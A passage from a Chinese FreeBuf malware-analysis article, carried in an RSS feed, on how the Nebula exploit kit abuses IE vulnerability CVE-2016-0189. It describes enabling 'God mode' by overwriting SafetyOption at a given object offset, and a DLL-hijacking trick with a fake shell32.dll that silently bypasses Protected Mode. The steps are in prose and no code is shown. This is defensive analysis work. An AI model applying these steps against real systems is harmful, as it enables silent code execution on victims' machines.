&lt;p&gt;3）	然后在CSession对象偏移为4的地方，获取COleScript 对象;&lt;/p&gt;
&lt;p&gt;4）	而COleScript 对象0×174的地方则存放了SafetyOption，也就是所谓的上帝模式(GodMode)标记。利用上述方法(3)将其值修改为4，从而成功开启上帝模式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;4.	一个有趣的DLL劫持技巧&lt;/h2&gt;
&lt;p&gt;分析本来到这里可以结束了，然而我们在Nebula的漏洞利用包里发现了一个有趣的DLL劫持技巧。尽管在前面，上帝模式已经成功开启了，当IE的保护模式开启时（默认是开启的），Vista以后的版本在执行Shell.Applicaion对象的ShellExecute 函数时， 会弹出一个如下的对话框(除非被加载的程序在ElevationPolicy中定义了静默加载，比如notepad.exe)，向用户询问是否允许。正是由于这个原因，一些漏洞利用包选择了仅在XP系统上对CVE-2016-0189 进行利用。&lt;/p&gt;


&lt;p&gt;Nebula EK采用了一个BlackHat 2014[2]上 公布的技巧来规避这个问题。IE浏览器在创建Shell.Application 对象时，会加载%systemroot%\system32\shell32.dll。通常情况下%systemroot%为c:\windows目录。然而，攻击者可以通过如下方式进行DLL劫持攻击。&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;1）	在%temp%\ 目录下创建system32目录&lt;/p&gt;
&lt;p&gt;2）	在上面创建的目录下生成一个假的shell32.dll文件，用来加载需要加载的程序。Nebula EK 在VBScript脚本中会生成一个3K左右的文件。&lt;/p&gt;
&lt;p&gt;3）	在脚本创建Shell.Application对象之前，利用WScript.Shell 来 修改 %system32%环境变量，指向1)创建的目录&lt;/p&gt;
&lt;p&gt;4）	创建Shell.Application 对象，从而自动加载 假的shell32.dll文件，达到执行文件的目的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; 相应的代码片段如下。&lt;/p&gt;


&lt;p&gt;需要指出的是,通过这种方式加载的进程是低完整性(Low Integrity)的。通常被加载的程序还需要通过本地漏洞来进一步提权。&lt;/p&gt;
&lt;h2&gt;5.	总结&lt;/h2&gt;
&lt;p&gt;Nebula EK 通过CVE-2016-0189的一个漏洞，实现了对任意内存的读写，从而开启了上帝模式。并且配合一个DLL劫持技巧，达到了绕过IE保护模式，静默执行任何文件的目的。&lt;/p&gt;
&lt;h2&gt;6.	参考文献&lt;/h2&gt;
&lt;p&gt;[1]	PATCH ANALYSIS OF CVE-2016-0189. &lt;a href=&quot;http://theori.io/research/cve-2016-0189&quot; data-editable=&quot;true&quot; data-title=&quot;Patch Analysis of CVE-2016-0189&quot;&gt;Patch Analysis of CVE-2016-0189&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[2]	&lt;a href=&quot;https://msdn.microsoft.com/en-us/library/aa263402&quot; data-editable=&quot;true&quot; data-title=&quot;VarType Function&quot;&gt;VarType Function&lt;/a&gt;(v=vs.60).aspx&lt;/p&gt;
&lt;p&gt;[3]	 启明星辰CVE-2014-6332分析报告。&lt;a href=&quot;http://www.venustech.com.cn/UserFiles/20141210_%E6%97%A0%E9%9C%80%E6%8B%85%E5%BF%83%E6%BD%9C%E8%97%8F%E4%BA%8618%E5%B9%B4%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%20%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.pdf&quot; data-editable=&quot;true&quot; data-title=&quot;venustech.com.cn 的页面&quot;&gt;&lt;u&gt;http://www.venustech.com.cn/UserFiles/20141210_%E6%97%A0%E9%9C%80%E6%8B%85%E5%BF%83%E6%BD%9C%E8%97%8F%E4%BA%8618%E5%B9%B4%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%20%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.pdf&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[4]	Write Once, Pwn Anywhere.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.blackhat.com/docs/us-14/materials/us-14-Yu-Write-Once-Pwn-Anywhere.pdf&quot; data-editable=&quot;true&quot; data-title=&quot;blackhat.com 的页面&quot;&gt;&lt;u&gt;https://www.blackhat.com/docs/us-14/materials/us-14-Yu-Write-Once-Pwn-Anywhere.pdf&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;*原创作者：兰云科技银河实验室，本文属FreeBuf原创奖励计划，未经许可禁止转载&lt;/b&gt;&lt;/p&gt;</description>
<author>蘑菇</author>
<guid isPermaLink="false">2017-04-18-26427502</guid>
<pubDate>Tue, 18 Apr 2017 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
